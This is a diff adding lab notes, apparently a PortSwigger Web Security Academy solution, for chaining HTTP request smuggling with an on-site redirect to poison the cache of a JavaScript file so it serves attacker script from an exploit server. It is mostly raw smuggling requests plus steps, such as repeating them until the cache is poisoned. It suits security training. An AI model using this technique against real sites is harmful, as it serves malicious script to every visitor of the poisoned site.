@@ -1,0 +1,36 @@
+// Find redirect - 302 response status code
+
+// Test the redirect
+POST / HTTP/1.1
+Host: aca21f9f1e9b4cb4806816da00b500c1.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 178
+Transfer-Encoding: chunked
+
+0
+
+GET /post/next?postId=4 HTTP/1.1
+Host: ac8d1fee1ed84c02807f165e018100d7.web-security-academy.net		# Response should be 302 with host=exploit server
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=1
+
+// On your exploit server, add the URL to /post to host malicious javascript
+
+// Launch the redirect attack above followed immediately by a request to a javascript resource
+GET /resources/js/tracking.js HTTP/1.1
+Host: aca21f9f1e9b4cb4806816da00b500c1.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://aca21f9f1e9b4cb4806816da00b500c1.web-security-academy.net/
+Connection: close
+Cookie: session=RMdJ7fjLa6ibOM0uKQFAlxojPRUhndxI
+
+
+// Repeat the redirect attack + GET request to javascript a few times.
+// This is to poison the cache of the request to javascript to our malicious javascript on exploit server
+// If the attack has succeeded, the response to the javascript request should be a redirect to your exploit server.
+// Confirm that the cache has been poisoned by repeating the request to javascript several times and confirming that you receive the redirect every time. 
